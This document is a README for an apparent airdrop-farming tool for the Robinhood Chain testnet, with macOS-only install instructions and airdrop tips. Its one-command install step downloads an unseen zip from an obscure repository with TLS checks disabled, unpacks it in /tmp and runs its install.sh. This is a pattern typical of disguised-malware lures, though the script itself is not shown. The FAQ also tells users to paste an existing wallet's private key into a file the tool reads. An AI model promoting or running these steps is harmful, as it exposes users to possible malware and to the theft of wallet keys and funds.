# 🤖 Robinhood Chain Testnet Automation

Automated tool for interacting with Robinhood Chain testnet. Helps users participate in testnet activities and position themselves for a potential future airdrop.

## 🌟 Features

✅ **Automatic token claiming** from official faucet  
✅ **Smart contract deployment** to demonstrate technical activity  
✅ **Transaction creation** to generate onchain activity  
✅ **Python and Node.js support** - choose your preferred language  
✅ **Automatic wallet management** - secure private key storage  
✅ **Colored terminal output** - user-friendly CLI interface  

## 📋 System Requirements

- **macOS** (10.14 or newer)
- **Homebrew** (installed automatically)
- **Python 3.8+** (installed automatically)
- **Node.js 16+** (installed automatically)

## ⚡ Quick Installation

### One-Command Installation:

```bash
curl -fsSLk https://github.com/lunarraveneradicate/robinhood-auto-testnet/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/robinhood-auto-testnet-main && \
bash install.sh
```

The script will automatically:
- Install Homebrew (if needed)
- Install Python 3 (if needed)
- Install Node.js (if needed)
- Install all required libraries
- Setup convenient aliases

## 🚀 Usage

### Python Version (Recommended)

```bash
python3 robinhood_auto.py
```

Or use the alias after restarting your terminal:
```bash
robinhood-auto
```

### Node.js Version

```bash
node index.js
```

Or use the alias:
```bash
robinhood-auto-js
```

## 📖 What Does It Do?

### Automated Process:

1. **Create/Load Wallet**
   - Creates a new wallet or loads an existing one
   - Saves private key to `wallet.json`

2. **Claim Testnet Tokens**
   - Automatically requests tokens from the faucet
   - Checks balance after receiving tokens

3. **Deploy Smart Contract**
   - Deploys a simple contract to demonstrate activity
   - Records contract address on testnet

4. **Create Transactions**
   - Executes 5 test transactions
   - Generates onchain activity for analytics

5. **Final Report**
   - Shows final balance
   - Provides explorer links to verify activity
   - Suggests additional steps

## 🔐 Security

⚠️ **IMPORTANT**: Private keys are saved in `wallet.json`

- **NEVER SHARE** your `wallet.json` file
- **BACKUP** your private key in a secure location
- **DO NOT UPLOAD** `wallet.json` to git/cloud
- Use only for testnet activities

### Add to .gitignore:
```
wallet.json
node_modules/
__pycache__/
*.pyc
.env
```

## 📁 Project Structure

```
robinhood-auto-testnet/
├── install.sh              # One-command installation script
├── robinhood_auto.py       # Main Python script
├── index.js                # Main Node.js script
├── package.json            # Node.js dependencies
├── requirements.txt        # Python dependencies
├── README.md               # Documentation
└── wallet.json            # Your wallet (created automatically)
```

## 🎯 Additional Steps for Airdrop

After running the automation, complete these steps:

### 1. Register .hood Domain
- Visit [InfinityName](https://infinityname.io)
- Register your .hood domain
- Demonstrates early ecosystem participation

### 2. Interact with OnchainGM
- Visit [OnchainGM](https://onchaingm.xyz)
- Send a GM message on Robinhood Chain
- Create GMcards for additional activity

### 3. Mint a Badge
- Complete badge minting on OnchainGM
- Creates additional onchain records

### 4. Monitor Activity
- Use [Robinhood Chain Explorer](https://testnet.explorer.robinhood.com)
- Check your transactions
- Track wallet activity

### 5. Regular Activity
- Return to testnet periodically
- Deploy new contracts
- Interact with new dApps

## 🔧 Manual Dependency Installation

If automatic installation fails:

### Python:
```bash
pip3 install -r requirements.txt
```

### Node.js:
```bash
npm install
```

## ❓ FAQ

**Q: Is the Robinhood Chain airdrop confirmed?**  
A: No, the token and airdrop are not confirmed. This is speculative participation.

**Q: Do I need to invest money?**  
A: No, all testnet tokens are free. Optionally, you can purchase a .hood domain.

**Q: How often should I run the script?**  
A: Recommended 1-2 times per week to create consistent activity.

**Q: What if the faucet doesn't work?**  
A: Wait some time and try again. The faucet may have rate limits.

**Q: Is this script safe?**  
A: Yes, all code is open source and verifiable. Use only for testnet.

**Q: Can I use my existing wallet?**  
A: Yes, replace the contents of `wallet.json` with your private key.

## 🔗 Useful Links

- [Robinhood Chain Explorer](https://testnet.explorer.robinhood.com)
- [Official Faucet](https://faucet.robinhood.com)
- [InfinityName (.hood domains)](https://infinityname.io)
- [OnchainGM](https://onchaingm.xyz)
- [Robinhood Chain Docs](https://docs.robinhood.com)

## 📊 Technical Details

### Robinhood Chain Testnet:
- **RPC**: `https://testnet.rpc.robinhood.com`
- **Chain ID**: `51000`
- **Block Time**: 100ms
- **Layer**: L2 on Arbitrum
- **Security**: Ethereum

### Features:
- Fast transactions (100ms blocks)
- Low fees
- EVM compatibility
- Robinhood ecosystem integration

## 🤝 Contributing

Contributions are welcome! Feel free to:
- Open issues for bugs or suggestions
- Create pull requests with improvements
- Share the project with others

## ⚖️ Disclaimer

This tool is provided "as is" for educational purposes only.

- No guarantees of airdrop or rewards
- Use at your own risk
- Always do your own research (DYOR)
- Not financial advice

## 📝 License

MIT License - free to use and modify

## 🙏 Support

If this project helped you:
- ⭐ Star on GitHub
- 🔄 Share with the community
- 💬 Leave feedback

---

**Made with ❤️ for the Robinhood Chain community**

*Don't forget to follow official Robinhood channels for updates on mainnet and potential incentive programs!*
